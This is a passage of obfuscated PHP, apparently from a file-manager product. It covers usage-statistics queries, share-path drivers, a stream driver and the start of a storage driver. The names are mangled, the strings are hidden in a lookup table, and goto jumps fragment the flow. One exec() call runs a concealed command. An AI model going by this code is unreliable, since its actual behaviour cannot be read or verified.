} private function dateList($ÚÜ°¨şÁ) { $š¿èÑµ¦ =& $_SERVER[ï»»·÷á]; $Ê”´êß” = $ÚÜ°¨şÁ; $¼›‚ ²¼ = strtotime($š¿èÑµ¦[1805]); $Ø³‹½²– = array(); while ($Ê”´êß” <= $¼›‚ ²¼) { $Ø³‹½²–[] = date($š¿èÑµ¦[1804], $Ê”´êß”); $Ê”´êß” = strtotime($š¿èÑµ¦[1807], $Ê”´êß”); } return $Ø³‹½²–; } public function _recordUser($Üİ‹¦ã = '') { $›…×…¡÷ =& $_SERVER[ï»»·÷á]; $±Åö©«à = strtotime(date($›…×…¡÷[1808], strtotime($Üİ‹¦ã))); $•ÊÚĞÃÑ = strtotime(date($›…×…¡÷[1809], strtotime($Üİ‹¦ã))); $©Ï–± = array($›…×…¡÷[201] => array($›…×…¡÷[1023], $•ÊÚĞÃÑ)); $Ş¦¤·ñ¶ = Model($›…×…¡÷[534])->where($©Ï–±)->count($›…×…¡÷[1678]); $©Ï–±[$›…×…¡÷[201]] = array($›…×…¡÷[333], array($±Åö©«à, $•ÊÚĞÃÑ)); $“Á‘¬² = Model($›…×…¡÷[534])->where($©Ï–±)->count($›…×…¡÷[1678]); $©Ï–±[$›…×…¡÷[33]] = $›…×…¡÷[1810]; $»×ã¹å« = Model($›…×…¡÷[1811])->where($©Ï–±)->count($›…×…¡÷[1812]); $ı¥ğÈ˜‰ = array($›…×…¡÷[224] => $Üİ‹¦ã, $›…×…¡÷[778] => (int) $Ş¦¤·ñ¶, $›…×…¡÷[1797] => (int) $“Á‘¬², $›…×…¡÷[1798] => (int) $»×ã¹å«); return $this->insert($ı¥ğÈ˜‰); } public function _recordStore($ƒ°«¤– = '') { $ÚñÏÄî‘ =& $_SERVER[ï»»·÷á]; $äîÁ¿ü = strtotime(date($ÚñÏÄî‘[1809], strtotime($ƒ°«¤–))); $ÎÆÑ¡ = array($ÚñÏÄî‘[201] => array($ÚñÏÄî‘[1023], $äîÁ¿ü)); $ÙÑáß†£ = Model($ÚñÏÄî‘[480])->where($ÎÆÑ¡)->sum($ÚñÏÄî‘[76]); $ÎÆÑ¡[$ÚñÏÄî‘[419]] = 0; $¸ä¨í×› = Model($ÚñÏÄî‘[838])->where($ÎÆÑ¡)->sum($ÚñÏÄî‘[76]); $ÎÆÑ¡[$ÚñÏÄî‘[420]] = 1; $ìá×ïûÏ = Model($ÚñÏÄî‘[838])->where($ÎÆÑ¡)->sum($ÚñÏÄî‘[76]); $ÎÆÑ¡[$ÚñÏÄî‘[420]] = 2; $ßæµÊ = Model($ÚñÏÄî‘[838])->where($ÎÆÑ¡)->sum($ÚñÏÄî‘[76]); $²“¯óÚ¿ = array($ÚñÏÄî‘[224] => $ƒ°«¤–, $ÚñÏÄî‘[776] => (int) $¸ä¨í×›, $ÚñÏÄî‘[1801] => (int) $ÙÑáß†£, $ÚñÏÄî‘[1802] => (int) $ìá×ïûÏ, $ÚñÏÄî‘[1803] => (int) $ßæµÊ); return $this->insert($²“¯óÚ¿); } public function trend($åÃœÀØŒ, $óĞÃáˆì) { $»Ÿ¦Ş±ö =& $_SERVER[ï»»·÷á]; if (!$this->init($åÃœÀØŒ)) { return !1; } $ú©éš±® = $this->trendList($åÃœÀØŒ); if ($ú©éš±® && $óĞÃáˆì != $»Ÿ¦Ş±ö[1651]) { $å–øßÉ· = $ú©éš±®[0][$»Ÿ¦Ş±ö[224]]; $ÌĞÕ·¦ = $this->validDate($óĞÃáˆì, $å–øßÉ·); $•éãïÔ× = array(); $®ê¤Ë‡ = array_to_keyvalue($ú©éš±®, $»Ÿ¦Ş±ö[224]); foreach ($ÌĞÕ·¦ as $ØõÀ…¢‡) { if (isset($®ê¤Ë‡[$ØõÀ…¢‡])) { $îçœ¨òì = $®ê¤Ë‡[$ØõÀ…¢‡]; } else { $îçœ¨òì = end($ú©éš±®); $îçœ¨òì[$»Ÿ¦Ş±ö[224]] = $ØõÀ…¢‡; if ($åÃœÀØŒ == $»Ÿ¦Ş±ö[599]) { $îçœ¨òì[$»Ÿ¦Ş±ö[1797]] = $îçœ¨òì[$»Ÿ¦Ş±ö[1798]] = 0; } } $•éãïÔ×[] = $îçœ¨òì; } $ú©éš±® = $•éãïÔ×; } $¨´¼âºµ = array($»Ÿ¦Ş±ö[599] => array($»Ÿ¦Ş±ö[778] => LNG($»Ÿ¦Ş±ö[1813]), $»Ÿ¦Ş±ö[1797] => LNG($»Ÿ¦Ş±ö[1814]), $»Ÿ¦Ş±ö[1798] => LNG($»Ÿ¦Ş±ö[1815])), $»Ÿ¦Ş±ö[1799] => array($»Ÿ¦Ş±ö[776] => LNG($»Ÿ¦Ş±ö[1816]), $»Ÿ¦Ş±ö[1801] => LNG($»Ÿ¦Ş±ö[1817]), $»Ÿ¦Ş±ö[1802] => LNG($»Ÿ¦Ş±ö[1818]), $»Ÿ¦Ş±ö[1803] => LNG($»Ÿ¦Ş±ö[1819]))); $çå”‡˜Ä = array($»Ÿ¦Ş±ö[599] => $»Ÿ¦Ş±ö[1820], $»Ÿ¦Ş±ö[1799] => $»Ÿ¦Ş±ö[76]); if (empty($ú©éš±®)) { $ØõÀ…¢‡ = date($»Ÿ¦Ş±ö[1804], strtotime($»Ÿ¦Ş±ö[1805])); $ø‹½©¿‹ = array($»Ÿ¦Ş±ö[224] => $ØõÀ…¢‡); foreach ($¨´¼âºµ[$åÃœÀØŒ] as $ŒÃüûéè => $œ¿øˆæ½) { $ø‹½©¿‹[$ŒÃüûéè] = 0; } $ú©éš±®[] = $ø‹½©¿‹; } $¯Ü€ËŞ = array(); foreach ($ú©éš±® as $œ¿øˆæ½) { if ($åÃœÀØŒ == $»Ÿ¦Ş±ö[1799] && $œ¿øˆæ½[$»Ÿ¦Ş±ö[1801]] > $œ¿øˆæ½[$»Ÿ¦Ş±ö[776]]) { $œ¿øˆæ½[$»Ÿ¦Ş±ö[1801]] = $œ¿øˆæ½[$»Ÿ¦Ş±ö[776]]; } foreach ($¨´¼âºµ[$åÃœÀØŒ] as $ŒÃüûéè => $¸¥¹ú) { $îçœ¨òì = array($»Ÿ¦Ş±ö[224] => $œ¿øˆæ½[$»Ÿ¦Ş±ö[224]], $»Ÿ¦Ş±ö[1576] => $¸¥¹ú); $îçœ¨òì[$çå”‡˜Ä[$åÃœÀØŒ]] = isset($œ¿øˆæ½[$ŒÃüûéè]) ? $œ¿øˆæ½[$ŒÃüûéè] : 0; $¯Ü€ËŞ[] = $îçœ¨òì; } } return $¯Ü€ËŞ; } public function validDate($Ã“Óßü, $œõÉ®–) { $ê¥–¤Å =& $_SERVER[ï»»·÷á]; $±âåºğ† = date($ê¥–¤Å[1804], strtotime($ê¥–¤Å[1805])); $ÏÂ²Œ¥è = array($±âåºğ†); switch ($Ã“Óßü) { case $ê¥–¤Å[1658]: $ÙÚ¦×Û = mktime(0, 0, 0, date($ê¥–¤Å[1821]), date($ê¥–¤Å[1397]) - date($ê¥–¤Å[1460]) + 7 - 7, date($ê¥–¤Å[1822])); $ÓÏÕë³ = 0; do { $ï”ğ«ë« = date($ê¥–¤Å[1804], $ÙÚ¦×Û - 3600 * 24 * 7 * $ÓÏÕë³); $ÏÂ²Œ¥è[] = $ï”ğ«ë«; $ÓÏÕë³++; } while ($œõÉ®– < $ï”ğ«ë«); break; case $ê¥–¤Å[1656]: $ÓÏÕë³ = 1; do { $ØïÁÎ¨š = date($ê¥–¤Å[1823], strtotime("\55\x20{$ÓÏÕë³}\x20\155\157\156\164\150\163")); $ÏÂ²Œ¥è[] = $ØïÁÎ¨š; $ÓÏÕë³++; } while ($œõÉ®– < $ØïÁÎ¨š); break; case $ê¥–¤Å[1824]: $š°øüÓÔ = (int) date($ê¥–¤Å[1822], strtotime($œõÉ®–)); $¯µ¯òŸ¥ = (int) date($ê¥–¤Å[1822]); if ($š°øüÓÔ >= $¯µ¯òŸ¥) { break; } for ($š°øüÓÔ; $š°øüÓÔ < $¯µ¯òŸ¥; $š°øüÓÔ++) { $ÏÂ²Œ¥è[] = $š°øüÓÔ . $ê¥–¤Å[1825]; } break; default: break; } if ($œõÉ®– > end($ÏÂ²Œ¥è)) { array_pop($ÏÂ²Œ¥è); } sort($ÏÂ²Œ¥è); return $ÏÂ²Œ¥è; } public function listTable($ÓœÚ¬Ó…) { $ó‹Ğ„‚´ = ucfirst($ÓœÚ¬Ó…); return Model($ó‹Ğ„‚´)->listData(); } public function option($—°°Æ¿°) { $¹Ÿ£ÄÖ“ = $_SERVER[ï»»·÷á][1826] . ucfirst($—°°Æ¿°); return $this->{$¹Ÿ£ÄÖ“}(); } private function optionUser() { $ğø«¨ª =& $_SERVER[ï»»·÷á]; $¨Ñò˜şû = Model($ğø«¨ª[534])->count($ğø«¨ª[1678]); $ÙÚÀÎ«™ = Model($ğø«¨ª[534])->where($ğø«¨ª[1827])->count($ğø«¨ª[1678]); $Ó‡¦„Ÿü = intval($GLOBALS[$ğø«¨ª[6]][$ğø«¨ª[349]][$ğø«¨ª[1633]]) / 3600; $­¡ÛÔ¹š = strtotime("\55{$Ó‡¦„Ÿü}\x20\150\x6f\165\162\x73"); $…Ô¥¾Ùë = strtotime(date($ğø«¨ª[1808])); if ($­¡ÛÔ¹š < $…Ô¥¾Ùë) { $­¡ÛÔ¹š = $…Ô¥¾Ùë; } $°À…™Äæ = array($ğø«¨ª[1828] => array($ğø«¨ª[1024], $­¡ÛÔ¹š)); $²Ê©Ö¸¡ = (int) Model($ğø«¨ª[534])->where($°À…™Äæ)->count($ğø«¨ª[1678]); if (!$²Ê©Ö¸¡) { $²Ê©Ö¸¡ = 1; } $°À…™Äæ = array($ğø«¨ª[1828] => array($ğø«¨ª[1024], $…Ô¥¾Ùë)); $Ğ±—ÔÅ = Model($ğø«¨ª[534])->where($°À…™Äæ)->count($ğø«¨ª[1678]); return array($ğø«¨ª[771] => (int) $¨Ñò˜şû, $ğø«¨ª[1829] => (int) ($¨Ñò˜şû - $ÙÚÀÎ«™), $ğø«¨ª[1830] => (int) $ÙÚÀÎ«™, $ğø«¨ª[1831] => (int) $Ğ±—ÔÅ, $ğø«¨ª[1832] => $²Ê©Ö¸¡); } private function optionFile() { $üÛúúï =& $_SERVER[ï»»·÷á]; $ŞÍ×±ËË = $this->sourceSize(); $ş…‡âù© = $ŞÍ×±ËË[$üÛúúï[76]]; $Áò†Øá• = $ŞÍ×±ËË[$üÛúúï[1801]]; $—¶…†¦Ê = Model($üÛúúï[838])->where(array($üÛúúï[419] => 0))->count($üÛúúï[411]); $Ğ©‹µŠä = array($üÛúúï[419] => 0, $üÛúúï[201] => array($üÛúúï[1024], strtotime(date($üÛúúï[1808])))); $—ò›şÚÑ = Model($üÛúúï[838])->where($Ğ©‹µŠä)->sum($üÛúúï[76]); $˜É†¹ = Model($üÛúúï[838])->where($Ğ©‹µŠä)->count($üÛúúï[411]); return array($üÛúúï[776] => $ş…‡âù©, $üÛúúï[1801] => $Áò†Øá•, $üÛúúï[1833] => $ş…‡âù© - $Áò†Øá•, $üÛúúï[1834] => (int) $—ò›şÚÑ, $üÛúúï[778] => (int) $—¶…†¦Ê, $üÛúúï[1835] => (int) $˜É†¹); } private function optionAccess() { $ïô©ÒÎµ =& $_SERVER[ï»»·÷á]; return array($ïô©ÒÎµ[771] => $this->typeLogCnt(), $ïô©ÒÎµ[107] => $this->typeLogCnt($ïô©ÒÎµ[107]), $ïô©ÒÎµ[461] => $this->typeLogCnt($ïô©ÒÎµ[461]), $ïô©ÒÎµ[1836] => $this->typeLogCnt($ïô©ÒÎµ[1836]), $ïô©ÒÎµ[1837] => $this->typeLogCnt($ïô©ÒÎµ[1837]), $ïô©ÒÎµ[599] => $this->typeLogCnt($ïô©ÒÎµ[12], $ïô©ÒÎµ[1812])); } private function typeLogCnt($„£¸ã  = '', $°ï­íØ = "\151\144") { $äêƒ°ºÕ =& $_SERVER[ï»»·÷á]; $¦¾‹Á·º = array($äêƒ°ºÕ[107] => array($äêƒ°ºÕ[1838], $äêƒ°ºÕ[1839]), $äêƒ°ºÕ[461] => array($äêƒ°ºÕ[1840], $äêƒ°ºÕ[1841]), $äêƒ°ºÕ[1836] => array($äêƒ°ºÕ[1842], $äêƒ°ºÕ[1843], $äêƒ°ºÕ[1844]), $äêƒ°ºÕ[1837] => array($äêƒ°ºÕ[1845], $äêƒ°ºÕ[1846]), $äêƒ°ºÕ[1847] => array($äêƒ°ºÕ[1848], $äêƒ°ºÕ[1849], $äêƒ°ºÕ[1850])); $Ğ²ìÉŸê = strtotime(date($äêƒ°ºÕ[1808])); $›Œ‹³Ğ = array($äêƒ°ºÕ[201] => array($äêƒ°ºÕ[1024], $Ğ²ìÉŸê)); if ($„£¸ã ) { $›Œ‹³Ğ[$äêƒ°ºÕ[33]] = array($äêƒ°ºÕ[7], $¦¾‹Á·º[$„£¸ã ]); } $À¼ùşˆ‰ = Model($äêƒ°ºÕ[1811])->where($›Œ‹³Ğ)->count($°ï­íØ); return (int) $À¼ùşˆ‰; } private function optionServer() { $âœÚì ƒ =& $_SERVER[ï»»·÷á]; $‚×·Ûî = $this->diskDriver(); $«âäÍ—Æ = KodIO::defaultDriver(); $¦ä‰¹¾‚ = array($âœÚì ƒ[830] => $«âäÍ—Æ[$âœÚì ƒ[399]]); $Ã˜ôŸ¬ = Model($âœÚì ƒ[480])->where($¦ä‰¹¾‚)->sum($âœÚì ƒ[76]); $›¨ë–Ó = explode($âœÚì ƒ[53], $_SERVER[$âœÚì ƒ[143]]); $–”²îóç = $›¨ë–Ó[0]; $Å†¤æ™ = $GLOBALS[$âœÚì ƒ[6]][$âœÚì ƒ[21]]; $£ïÂÆÃé = $Å†¤æ™[$âœÚì ƒ[986]]; if ($£ïÂÆÃé == $âœÚì ƒ[974]) { $şê©Éá“ = explode($âœÚì ƒ[1289], $Å†¤æ™[$âœÚì ƒ[985]]); $£ïÂÆÃé = $şê©Éá“[0]; } if ($£ïÂÆÃé == $âœÚì ƒ[922] || $£ïÂÆÃé == $âœÚì ƒ[817]) { $¨Ğ†—£± = Model()->db()->query($âœÚì ƒ[1851]); $Ûı°ÔÚ = $¨Ğ†—£±[0] && isset($¨Ğ†—£±[0][$âœÚì ƒ[1575]]) ? $¨Ğ†—£±[0][$âœÚì ƒ[1575]] : 0; $£ïÂÆÃé = $âœÚì ƒ[1852] . ($Ûı°ÔÚ ? $âœÚì ƒ[8] . $Ûı°ÔÚ : $âœÚì ƒ[12]); } $¼¨†øçò = $GLOBALS[$âœÚì ƒ[6]][$âœÚì ƒ[349]][$âœÚì ƒ[840]]; return array($âœÚì ƒ[1853] => $‚×·Ûî ? $‚×·Ûî[$âœÚì ƒ[1854]] : 0, $âœÚì ƒ[1855] => $‚×·Ûî ? $‚×·Ûî[$âœÚì ƒ[1856]] : 0, $âœÚì ƒ[1857] => (int) $«âäÍ—Æ[$âœÚì ƒ[1854]] * 1024 * 1024 * 1024, $âœÚì ƒ[1858] => (int) $Ã˜ôŸ¬, $âœÚì ƒ[1859] => ucfirst($–”²îóç), $âœÚì ƒ[1860] => $âœÚì ƒ[1861] . PHP_VERSION, $âœÚì ƒ[1862] => phpBuild64() ? 64 : 32, $âœÚì ƒ[770] => str_replace($âœÚì ƒ[1140], $âœÚì ƒ[1002], $£ïÂÆÃé), $âœÚì ƒ[349] => ucfirst($¼¨†øçò), $âœÚì ƒ[32] => $_SERVER[$âœÚì ƒ[1863]]); } private function diskDriver() { $¾Ğ¨«€é =& $_SERVER[ï»»·÷á]; $è¶òœ˜ù = $¾Ğ¨«€é[8]; $Ó¬Àã­¶ = $GLOBALS[$¾Ğ¨«€é[6]][$¾Ğ¨«€é[1306]] == $¾Ğ¨«€é[1307]; if ($Ó¬Àã­¶) { $è¶òœ˜ù = $¾Ğ¨«€é[1864]; if (function_exists($¾Ğ¨«€é[1865])) { exec($¾Ğ¨«€é[1866], $øÈ›àÌÙ); $è¶òœ˜ù = $øÈ›àÌÙ[1] . $¾Ğ¨«€é[8]; } } if (!file_exists($è¶òœ˜ù)) { return; } $ÂÎÊî¬Ó = @disk_total_space($è¶òœ˜ù); $ˆû» Ë = $ÂÎÊî¬Ó - @disk_free_space($è¶òœ˜ù); return array($¾Ğ¨«€é[1854] => $ÂÎÊî¬Ó, $¾Ğ¨«€é[1856] => $ˆû» Ë); } public function fileChart($İ³Ë—­) { $Ö¨µå =& $_SERVER[ï»»·÷á]; if (isset($İ³Ë—­[$Ö¨µå[1678]])) { return Model($Ö¨µå[838])->userFileTypeProfile($İ³Ë—­[$Ö¨µå[1678]]); } if (isset($İ³Ë—­[$Ö¨µå[1867]])) { return Model($Ö¨µå[838])->groupFileTypeProfile($İ³Ë—­[$Ö¨µå[1867]]); } $÷ÔéÊ = $this->sourceSize(); $ê‡ÕŒ = array($Ö¨µå[441] => 0, $Ö¨µå[420] => 1); $ç´çÖ˜Ÿ = Model($Ö¨µå[838])->where($ê‡ÕŒ)->sum($Ö¨µå[76]); $ê‡ÕŒ[$Ö¨µå[420]] = 2; $…„ø‘ÍÕ = Model($Ö¨µå[838])->where($ê‡ÕŒ)->sum($Ö¨µå[76]); return array($Ö¨µå[776] => $÷ÔéÊ[$Ö¨µå[76]], $Ö¨µå[1801] => $÷ÔéÊ[$Ö¨µå[1801]], $Ö¨µå[1802] => (int) $ç´çÖ˜Ÿ, $Ö¨µå[1803] => (int) $…„ø‘ÍÕ); } private function sourceSize() { $å Ú£èñ =& $_SERVER[ï»»·÷á]; $ã’­±Ç = Model($å Ú£èñ[838])->where(array($å Ú£èñ[419] => 0))->sum($å Ú£èñ[76]); $ªâ×†£É = Model($å Ú£èñ[480])->sum($å Ú£èñ[76]); if ($ªâ×†£É > $ã’­±Ç) { $ªâ×†£É = $ã’­±Ç; } return array($å Ú£èñ[76] => (int) $ã’­±Ç, $å Ú£èñ[1801] => (int) $ªâ×†£É); } } goto e¡ƒàøãÙé; fÀ»àí¹ëƒ: class PathDriverDbShareItem extends PathDriverDB { public function __construct($ó“³‰Ú¿) { $this->pathParse = $ó“³‰Ú¿; $this->model = Model($_SERVER[ï»»·÷á][1349]); } public function getPathOuter($°¶”üÖÄ) { $Ø¦œÑåù =& $_SERVER[ï»»·÷á]; if (!$°¶”üÖÄ) { return $°¶”üÖÄ; } $ëÓĞ³€ô = $this->parse($°¶”üÖÄ); return trim(KodIO::makeShare($this->pathParse[$Ø¦œÑåù[399]], $ëÓĞ³€ô[$Ø¦œÑåù[399]]), $Ø¦œÑåù[8]); } protected function infoParse($¤âŞ–’¦, $ôü…£ = false, $È€Ë›ß = false) { $ÂÑ¿øÙ§ =& $_SERVER[ï»»·÷á]; $ßÂï‡»å = $this->pathParse[$ÂÑ¿øÙ§[399]]; $úîº¸çï = trim($this->pathParse[$ÂÑ¿øÙ§[1178]], $ÂÑ¿øÙ§[8]); return Action($ÂÑ¿øÙ§[1357])->sharePathInfo($ßÂï‡»å, $úîº¸çï, $ôü…£); } public function infoFull($åù¸©ùî) { $¡¸¼£åá =& $_SERVER[ï»»·÷á]; $ÇÒèä½Û = explode($¡¸¼£åá[8], trim($åù¸©ùî, $¡¸¼£åá[8])); if (count($ÇÒèä½Û) > 1) { $§†ÎÆ’ = implode($¡¸¼£åá[8], array_splice($ÇÒèä½Û, 1)); $è›’¬öñ = $this->model->pathInfoByPath($ÇÒèä½Û[0], $§†ÎÆ’); if (!$è›’¬öñ) { return !1; } $this->pathParse[$¡¸¼£åá[1178]] = $è›’¬öñ[$¡¸¼£åá[411]]; } return $this->infoParse($åù¸©ùî); } public function listAll($óÕ€«‹‰) { $’ÔÍã¯é =& $_SERVER[ï»»·÷á]; $‚¶ßöã¢ = IO::info($this->pathParse[$’ÔÍã¯é[84]]); if (!$‚¶ßöã¢) { return array(); } $Œñ¼ñ = $this->model->listAll($óÕ€«‹‰); $Âİ×í¨ = Model($’ÔÍã¯é[601])->getInfo($‚¶ßöã¢[$’ÔÍã¯é[602]]); foreach ($Œñ¼ñ as &$‰”´ø’ß) { check_abort(); $‰”´ø’ß[$’ÔÍã¯é[87]] = Action($’ÔÍã¯é[1357])->_shareItemeParse($‰”´ø’ß[$’ÔÍã¯é[87]], $Âİ×í¨); } unset($‰”´ø’ß); return $Œñ¼ñ; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($äââ‰õó) { $this->pathParse = $äââ‰õó; $this->model = Model($_SERVER[ï»»·÷á][1349]); } protected function infoParse($ëÇ•àµÂ, $ó–‘§ï‰ = false, $í­êÀ×¢ = false) { $ î²¶‚è =& $_SERVER[ï»»·÷á]; return Action($ î²¶‚è[1184])->sharePathInfo($this->pathParse[$ î²¶‚è[84]], !0, $ó–‘§ï‰); } public function listPath($§ÚÒâ¡Ü, $Î’ÀÜ•­ = false) { $²ØÙåÑ =& $_SERVER[ï»»·÷á]; $şØÀÌÀ = parent::listPath($§ÚÒâ¡Ü, $Î’ÀÜ•­); if (!$şØÀÌÀ) { return $şØÀÌÀ; } if (is_array($şØÀÌÀ[$²ØÙåÑ[1358]])) { $şØÀÌÀ[$²ØÙåÑ[1358]] = Action($²ØÙåÑ[1184])->shareItemInfo($şØÀÌÀ[$²ØÙåÑ[1358]]); } foreach ($şØÀÌÀ as $×¼¼ Ş => $ƒ˜üË·÷) { if (!in_array($×¼¼ Ş, array($²ØÙåÑ[83], $²ØÙåÑ[82]))) { continue; } foreach ($ƒ˜üË·÷ as $³˜°†Ë‚ => $••§™™Ã) { $şØÀÌÀ[$×¼¼ Ş][$³˜°†Ë‚] = Action($²ØÙåÑ[1184])->shareItemInfo($••§™™Ã); } } return $şØÀÌÀ; } public function listAll($¿÷öÑÂ) { $äé ÁËİ =& $_SERVER[ï»»·÷á]; $ˆ°úúğò = IO::info($this->pathParse[$äé ÁËİ[84]]); if (!$ˆ°úúğò) { return array(); } $ı³Èèà = $this->model->listAll($¿÷öÑÂ); foreach ($ı³Èèà as &$ÊÊû—¬å) { $ÊÊû—¬å[$äé ÁËİ[87]] = Action($äé ÁËİ[1184])->shareItemInfo($ÊÊû—¬å[$äé ÁËİ[87]]); } unset($ÊÊû—¬å); return $ı³Èèà; } } class PathDriverDriverShareItem { public function __construct($îãóÒ½Í) { $this->pathParse = $îãóÒ½Í; } public function __call($ªÍ´ò÷†, $‰ß—´”î) { $º¨É»• =& $_SERVER[ï»»·÷á]; if (method_exists($this, $ªÍ´ò÷†)) { return; } $¡˜Çş´¡ = call_user_func_array(array($º¨É»•[1359], $ªÍ´ò÷†), $‰ß—´”î); $Å¦±´ÌÙ = array($º¨É»•[1360], $º¨É»•[1361], $º¨É»•[1362], $º¨É»•[1363], $º¨É»•[555], $º¨É»•[557], $º¨É»•[1364], $º¨É»•[107], $º¨É»•[1365], $º¨É»•[1366]); if (in_array($ªÍ´ò÷†, $Å¦±´ÌÙ)) { $¡˜Çş´¡ = $this->getPathOuter($¡˜Çş´¡); } return $¡˜Çş´¡; } public function copy($‰À˜çÖ, $öĞë§±¼, $Œû×”›É = false, $ùîØÊõ = false) { return $this->copyMove($‰À˜çÖ, $öĞë§±¼, $Œû×”›É, $_SERVER[ï»»·÷á][555], $ùîØÊõ); } public function move($ÉÒßÄÇ, $È€šĞ, $£ãüÑ› = false, $ŞÒ•ÓÊ¾ = false) { return $this->copyMove($ÉÒßÄÇ, $È€šĞ, $£ãüÑ›, $_SERVER[ï»»·÷á][557], $ŞÒ•ÓÊ¾); } private function copyMove($÷Š™°ëÀ, $„÷å£°È, $‚Öêáƒ·, $ŞìöªÏÉ, $³Ñù¬¯¡ = false) { $„È¹Ş÷† =& $_SERVER[ï»»·÷á]; $áÜşŸí¬ = $„÷å£°È; $ëµêôÀ = IO::driverMake($„÷å£°È); if ($ëµêôÀ->pathParse[$„È¹Ş÷†[1161]]) { $„÷å£°È = $ëµêôÀ->pathParse[$„È¹Ş÷†[1161]]; } else { $„÷å£°È = $áÜşŸí¬; } $–•şË…× = IO::copyMove($÷Š™°ëÀ, $„÷å£°È, $‚Öêáƒ·, $ŞìöªÏÉ, $³Ñù¬¯¡); $–•şË…× = $this->getPathOuter($–•şË…×); return $–•şË…×; } public function pathThis($–ø¡ÊÃô) { return get_path_this($this->pathParse[$_SERVER[ï»»·÷á][84]]); } public function pathFather($Ó£ÂñÏÑ) { return get_path_father($this->pathParse[$_SERVER[ï»»·÷á][84]]); } public function iconvSystem($Œ¡Šİ¸Ø) { return $Œ¡Šİ¸Ø; } protected function infoParse($øòï…é¢, $„¦Ö¨ = false) { $ºªâ¨™é =& $_SERVER[ï»»·÷á]; $¨ú£ˆÎ = $this->pathParse[$ºªâ¨™é[495]][$ºªâ¨™é[1185]] . $this->pathParse[$ºªâ¨™é[1178]]; if ($„¦Ö¨) { $ï¥»ëáË = IO::infoWithChildren($¨ú£ˆÎ); } else { $ï¥»ëáË = IO::info($¨ú£ˆÎ); } $»ÌÄ™ù = $this->pathParse[$ºªâ¨™é[495]]; return Action($ºªâ¨™é[1357])->_shareItemeParse($ï¥»ëáË, $»ÌÄ™ù); } public function listAll($×úÇ¬×Â) { $Î£‰ÎÈ =& $_SERVER[ï»»·÷á]; $ïªóÅ¬… = IO::listAll($×úÇ¬×Â); $ÎÓ•¼Á‡ = rtrim($this->pathParse[$Î£‰ÎÈ[495]][$Î£‰ÎÈ[1185]], $Î£‰ÎÈ[8]); foreach ($ïªóÅ¬… as &$·°‚á‹…) { $·°‚á‹…[$Î£‰ÎÈ[84]] = $this->pathDriver . $Î£‰ÎÈ[8] . ltrim(substr($·°‚á‹…[$Î£‰ÎÈ[84]], strlen($ÎÓ•¼Á‡)), $Î£‰ÎÈ[8]); } unset($·°‚á‹…); return $ïªóÅ¬…; } public function listAllSimple($ûÚ¶µˆ, $¸Œò°¿ = false) { $ïï–ÕÕ» =& $_SERVER[ï»»·÷á]; $§Ã„¼èª = $this->listAll($ûÚ¶µˆ); $…áÄäšÌ = $this->pathParse[$ïï–ÕÕ»[430]]; if (trim($…áÄäšÌ, $ïï–ÕÕ»[8]) == trim(get_path_father($…áÄäšÌ), $ïï–ÕÕ»[8])) { $¸Œò°¿ = !0; } return IO::init($ïï–ÕÕ»[12])->listAllSimpleMake($§Ã„¼èª, $…áÄäšÌ, $¸Œò°¿); } public function getPathOuter($¢´›­”) { $¬úªÅÏ‹ =& $_SERVER[ï»»·÷á]; $­ßÀÒí¬ = KodIO::parse($¢´›­”); if ($­ßÀÒí¬[$¬úªÅÏ‹[33]] == KodIO::KOD_SHARE_ITEM) { return $­ßÀÒí¬[$¬úªÅÏ‹[84]]; } $öÙ–Ôö = KodIO::clear($¢´›­”); $Ã½¹Ÿ¼À = KodIO::clear($this->pathParse[$¬úªÅÏ‹[495]][$¬úªÅÏ‹[1185]]); $ÜºÕÚÀ = substr($öÙ–Ôö, strlen($Ã½¹Ÿ¼À)); if (substr($öÙ–Ôö, 0, strlen($Ã½¹Ÿ¼À)) != $Ã½¹Ÿ¼À) { return !1; } return $this->pathParse[$¬úªÅÏ‹[1179]] . $¬úªÅÏ‹[8] . ltrim($ÜºÕÚÀ, $¬úªÅÏ‹[8]); } public function getType() { $Ñ¯ˆŞ¥û =& $_SERVER[ï»»·÷á]; $öÔïê÷ô = str_replace($Ñ¯ˆŞ¥û[74], $Ñ¯ˆŞ¥û[12], get_class($this)); return strtolower($öÔïê÷ô); } public function isTypeObject($§ƒ·ãëˆ) { return IO::isTypeObject($§ƒ·ãëˆ); } public function info($—²õˆ±Ñ) { return $this->infoParse($—²õˆ±Ñ); } public function infoAuth($«š•‘×æ) { return $this->infoParse($«š•‘×æ); } public function infoWithChildren($¹ÊÖ³¨ƒ) { return $this->infoParse($¹ÊÖ³¨ƒ, !0); } public function infoFull($é½ÜßÇÓ) { return $this->infoParse($é½ÜßÇÓ); } } goto Eø™¬ƒˆ·; A˜¢ó½‚Å¬: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ì¨ù©ô×, $úÀ¯æ± = 0) { parent::__construct(); $this->source = $ì¨ù©ô×; $this->sourceSize = $úÀ¯æ±; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ö–€ö¤‰ = false) { return $this->sourceSize; } public function getContent($Ò³“Ù”Ô = false) { return $this->fileSubstr($Ò³“Ù”Ô, 0, $this->sourceSize); } public function fileSubstr($Û¶Èå¿ƒ = false, $è•òúÜÁ = 0, $ùƒëø—ˆ = 0) { if (!$ùƒëø—ˆ) { $ùƒëø—ˆ = $this->sourceSize; } $Ø’í·ØÇ = $this->sourceSize - $è•òúÜÁ; if ($ùƒëø—ˆ >= $Ø’í·ØÇ) { $ùƒëø—ˆ = $Ø’í·ØÇ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $è•òúÜÁ, $ùƒëø—ˆ); } if ($this->sourceType == self::TYPE_FILE) { if ($ùƒëø—ˆ <= 0) { return $_SERVER[ï»»·÷á][12]; } $æãìç´ = ftell($this->source); fseek_64($this->source, $æãìç´ + $è•òúÜÁ); $®ŠÊš»· = @fread($this->source, $ùƒëø—ˆ); fseek_64($this->source, $æãìç´); return $®ŠÊš»·; } } public function hashMd5($æ¾šóĞÈ = false) { return md5($this->getContent()); } public static function hash($à±Æğæ°, $æØü×šÎ = 0) { $½³İ´ò = new PathDriverStream($à±Æğæ°, $æØü×šÎ); return $½³İ´ò->hashSimple($à±Æğæ°); } public static function md5($¤š¶Ÿó, $È”Œè¨Æ = 0) { $„‹ŞµÀš = new PathDriverStream($¤š¶Ÿó, $È”Œè¨Æ); return $„‹ŞµÀš->hashMd5($¤š¶Ÿó); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; 